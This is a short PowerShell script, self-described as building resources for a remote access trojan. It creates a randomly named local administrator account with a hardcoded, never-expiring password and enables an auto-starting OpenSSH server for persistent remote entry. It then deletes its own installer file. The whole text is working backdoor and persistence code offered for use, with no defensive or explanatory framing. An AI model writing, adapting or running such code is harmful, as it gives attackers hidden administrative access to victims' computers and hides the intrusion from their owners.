# builds resources for rat
# created by : jfrdgh (@bigmanlc on dc)

# random string for directories
function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | %  {[char]$_})
}


# create local admin for rat
$Username = random_text
$Password = "quentionabc123"

$group = "Administrators"

$adsi = [ADSI]"WinNT://$env:COMPUTERNAME"
$existing = $adsi.Children | where {$_.SchemaClassName -eq 'user' -and $_.Name -eq $Username }

if ($existing -eq $null) {

    Write-Host "Creating new local user $Username."
    & NET USER $Username $Password /add /y /expires:never
    
    Write-Host "Adding local user $Username to $group."
    & NET LOCALGROUP $group $Username /add

}
else {
    Write-Host "Setting password for existing local user $Username."
    $existing.SetPassword($Password)
}

Write-Host "Ensuring password for $Username never expires."
& WMIC USERACCOUNT WHERE "Name='$Username'" SET PasswordExpires=FALSE

# goto temp
$wd = random_text
$path = "$env:TEMP/$wd"
$initial_dir = Get-Location

# enabling persistant ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

pause
# make working directory
cd $path
mkdir $path

# cd $initial_dir
del installer.ps1
